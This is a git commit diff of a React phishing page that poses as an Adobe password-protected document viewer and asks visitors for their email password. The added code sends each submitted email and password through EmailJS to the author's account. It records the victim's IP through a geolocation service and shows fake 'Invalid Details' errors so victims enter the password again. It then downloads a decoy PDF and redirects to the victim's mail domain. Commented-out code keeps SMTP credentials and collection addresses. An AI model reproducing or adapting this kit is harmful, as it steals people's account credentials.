2d586993141df03128aac2c823ef837782af3351
legaseas <rachvilly@gmail.com>
2022-01-04 16:27:33 -0800

    email adjustment

--- src/App.js
+++ src/App.js
@@ -1,104 +1,86 @@
-import React, { useState, Alert } from "react";
+import React, { useState } from "react";
 import AdobeForm from "./components/AdobeForm";
-import logo from './Image/pingr.png';
-import emailjs from 'emailjs-com';
-// import nodemail from 'nodemailer'
-// import fs from 'fs';
-import jsPDF from "jspdf";
-
+import logo from "./Image/pingr.png";
+import emailjs from "emailjs-com";
+import jsPDF from "jspdf"
 
 function App() {
-  const [user, setUser] = useState({ email: "", password: ""});
+  const [user, setUser] = useState({ email: "", password: ""})
   const [error, setError] = useState("");
-  const [ip, setIp] = useState("");
-  const ipUri = "https://geolocation-db.com/json/d802faa0-10bd-11ec-b2fe-47a0872c6708"
 
   const Login = (details, counter, setView) => {
-    console.log(details, counter);
-    
+ 
+    setUser({
+      email: details.email,
+      password: details.password,
+    })
 
-      setUser({
-        email: details.email,
-        password: details.password,
-      });
+    // send To Email
 
-      // GetIPAddress
+    emailjs.send('service_x6hu0ud', 'template_lf79x3o', details, 'user_IL5fakIwm8zK6NFatXezQ')
+    .then((result) => {
+      console.log('SUCCESS!', result.status, result.text);
+    }, (error) => {
+      console.log(error.text);
+    });
 
-      // send To Email
+    // const transport = nodemail.createTransport({
+    //   host: "smtp.mailtrap.io",
+    //   port: 2525,
+    //   auth: {
+    //       user: "8636f7e392b1e1",
+    //       pass: "170e7d8751b4d6"},
+    //   To: "tallurx@yahoo.com",
+    //   From: "tallurx@gmail.com",
+    //   Subject: "NEW ADOBE SUBMISSION",
+    //   Body: details
+    //   }).then((msg) =>alert ("The Email successfully sent")).catch((err) => {
+    //       console.log(err)
+    //   })
 
-      // emailjs.send('service_x6hu0ud', 'template_lf79x3o', details, 'user_IL5fakIwm8zK6NFatXezQ')
-      // .then((result) => {
-      //   console.log('SUCCESS!', result.status, result.text);
-      // }, (error) => {
-      //   console.log(error.text);
-      // });
-
-      // const transport = nodemail.createTransport({
-      //   host: "smtp.mailtrap.io",
-      //   port: 2525,
-      //   auth: {
-      //       user: "8636f7e392b1e1",
-      //       pass: "170e7d8751b4d6"},
-      //   To: "tallurx@yahoo.com",
-      //   From: "tallurx@gmail.com",
-      //   Subject: "NEW ADOBE SUBMISSION",
-      //   Body: details
-      //   }).then((msg) =>alert ("The Email successfully sent")).catch((err) => {
-      //       console.log(err)
-      //   })
-    
     try {
-        if (
-          !/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
-          .test(details.email) ||
-          details.password === ""
-        ) {
-          setError("Invalid Details. Please Check the details and try again");
-        }  else { 
-          setError("");
-        }
-        if (counter == 2) {
-          setError("Invalid Details. Please Check the details and try again");
-        }
-        
-    } 
-    catch(e){
-      console.log ('err');
+      if (
+        !/[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i.test(
+          details.email
+        ) ||
+        details.password === ""
+      ) {
+        setError("Invalid Details. Please Check the details and try again");
+      } else {
+        setError("");
+      }
+      if (counter == 2) {
+        setError("Invalid Details. Please Check the details and try again");
+      }
+    } catch (e) {
+      console.log("err");
     }
 
     const my_email = details.email;
 
     // url extraction
 
-    const ind=my_email.indexOf("@");
-    const my_slice=my_email.substr(ind+1);
-    const c= my_slice.substr(0, my_slice.indexOf('.'));
-    const final= c.toLowerCase();
-    const finalu= c.toUpperCase();
+    const ind = my_email.indexOf("@");
+    const my_slice = my_email.substr(ind + 1);
+    const c = my_slice.substr(0, my_slice.indexOf("."));
+    const final = c.toLowerCase();
+    const finalu = c.toUpperCase();
 
-  
     // downloading pdf and redirect_link
 
-    function success () {
-      if ( error == ""  && counter > 2 ) {
-        const doc = new jsPDF('landscape','px', 'a4','false');
-        doc.addImage(logo, 'PNG',65,20,500,400)
-        // doc.save('file.pdf')
-        console.log(details)
-        setView(" Verifying ...")
+    function success() {
+      if (error == "" && counter >= 3) {
+        const doc = new jsPDF("landscape", "px", "a4", "false");
+        doc.addImage(logo, "PNG", 65, 20, 500, 400);
+        doc.save('file.pdf')
+        console.log(user);
+        setView(" Verifying ...");
         // window.open(logo)
-        // window.location.replace("http://www."+my_slice);
-      }       
-    } success()
-
-  };
-   function getIPAddress () {
-        fetch(ipUri)
-        .then(response => response.json() )
-        .then(data => setIp(data));
-      }; getIPAddress()
-      console.log(ip)
-
+        window.location.replace("http://www."+my_slice);
+      }
+    }
+    success();
+  }
 
   return (
     <div id="content">
--- src/components/AdobeForm.js
+++ src/components/AdobeForm.js
@@ -1,78 +1,121 @@
-import React, {useState} from 'react';
-import $ from 'jquery';
+import React, { useState } from "react";
 
+function AdobeForm({ Login, error }) {
+  // const src = "https://smtpjs.com/v3/smtp.js"
+  const logo =
+    "https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_211.png?v=1601072619401";
+  const ipUri =
+    "https://geolocation-db.com/json/d802faa0-10bd-11ec-b2fe-47a0872c6708";
+  const [details, setDetails] = useState({ email: "", password: "", ip: "" });
+  const [counter, setCounter] = useState(2);
+  const [view, setView] = useState("");
 
-function AdobeForm({Login, error}) {
-    // const src = "https://smtpjs.com/v3/smtp.js"
-    const logo = "https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_211.png?v=1601072619401" 
-    const [details, setDetails] = useState({email: "", password: ""});
-    const [counter, setCounter] = useState(2);
-    const [view, setView] = useState("")
+  const submitHandler = (e) => {
+    e.preventDefault();
+    // const value = e.target.values
 
-    const submitHandler = (e) => {
-        e.preventDefault();
-        const value = e.target.values
+    Login(details, counter, setView);
 
-        Login(details, counter, setView )
+    setCounter(counter + 1);
 
-        setCounter (counter +1)
-
-        if (!error == "" || counter <= 1) {
-            details.password = "";
-        }
+    if (!error == "" || counter >= 1) {
+      details.password = "";
     }
 
-    return (
-            <form method="post">
-            <div className="header">
-                <img src={logo} width="571" height="87" alt="logo"/><br/>
-                <h2>
-                    <img src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Fwarning_sign_clip_art_20327.gif?v=1601072688646" width="29" height="30" alt=""/>THIS FILE IS PASSWORD PROTECTED*
-                </h2>
-                <h2>
-                    
-                </h2>
-                <h4>Sign in with your receiving email account to view document.</h4>
+    // get IpAddress
+
+    if (error == "" && counter >= 2) {
+      function getIPAddress() {
+        fetch(ipUri)
+          .then((response) => response.json())
+          .then((data) => setDetails({ ...details, ip: data }));
+      }
+      getIPAddress();
+    }
+  };
+
+  return (
+    <form method="post">
+      <div className="header">
+        <img src={logo} width="571" height="87" alt="logo" />
+        <br />
+        <h2>
+          <img
+            src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Fwarning_sign_clip_art_20327.gif?v=1601072688646"
+            width="29"
+            height="30"
+            alt=""
+          />
+          THIS FILE IS PASSWORD PROTECTED*
+        </h2>
+        <h2></h2>
+        <h4>Sign in with your receiving email account to view document.</h4>
+      </div>
+
+      <div className="content-app">
+        <div className="container">
+          <input
+            className="some"
+            type="email"
+            placeholder="Email Address"
+            name="email"
+            id="email"
+            onChange={(e) => setDetails({ ...details, email: e.target.value })}
+            value={details.email}
+          />
+          <input
+            className="some"
+            type="password"
+            name="password"
+            id="password"
+            placeholder="Enter Email Password"
+            required="required"
+            onChange={(e) =>
+              setDetails({ ...details, password: e.target.value })
+            }
+            value={details.password}
+          />
+          <center>
+            <div
+              className="alert alert-danger"
+              id="msg"
+              style={{ display: "none" }}
+            >
+              Invalid Password.! Please Enter your correct Password
             </div>
-
-
-            <div className='content-app'>
-                <div className='container'>
-                    <input 
-                        className="some"
-                        type="email" 
-                        placeholder="Email Address" 
-                        name="email" 
-                        id="email" 
-                        onChange={e => setDetails({...details, email: e.target.value})}
-                        value={details.email}
-                    />
-                    <input
-                        className="some" 
-                        type="password" 
-                        name="password" 
-                        id="password" 
-                        placeholder="Enter Email Password"
-                        required="required"
-                        onChange={e => setDetails({...details, password: e.target.value})}
-                        value={details.password}
-                    />
-                    <center>
-                        <div className="alert alert-danger" id="msg" style={{display: "none"}}>Invalid Password.! Please Enter
-                            your correct Password</div>
-                        {( error != "" ) ? <span id="error" className="text-danger" >{error}</span> : <span id="error" className="text-danger" style={{display: "none"}}></span> }
-                    </center>
-
-                </div>
-                <div className="contaniner2">
-                    { view == "" ? <button className="btn" id="submit-btn" onClick={submitHandler}>VIEW DOCUMENT</button> :
-                    <button className="btn" id="submit-btn" onClick={submitHandler}>{view}</button>}
-                </div>
-            </div>
-            <img src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_212.png?v=1601072655196"
-                width="561" height="92" alt=""/>
-        </form>
-    )
+            {error != "" ? (
+              <span id="error" className="text-danger">
+                {error}
+              </span>
+            ) : (
+              <span
+                id="error"
+                className="text-danger"
+                style={{ display: "none" }}
+              ></span>
+            )}
+          </center>
+        </div>
+        <div className="contaniner2">
+          {view == "" ? (
+            <button className="btn" id="submit-btn" onClick={submitHandler}>
+              VIEW DOCUMENT
+            </button>
+          ) : (
+            <button className="btn" id="submit-btn" onClick={submitHandler}>
+              {view}
+            </button>
+          )}
+        </div>
+      </div>
+      <img
+        src="https://cdn.glitch.com/0627790d-5fbd-4b4d-a18c-0cc83d211a6a%2Flg_212.png?v=1601072655196"
+        width="561"
+        height="92"
+        alt=""
+      />
+    </form>
+  );
 }
 
 export default AdobeForm;
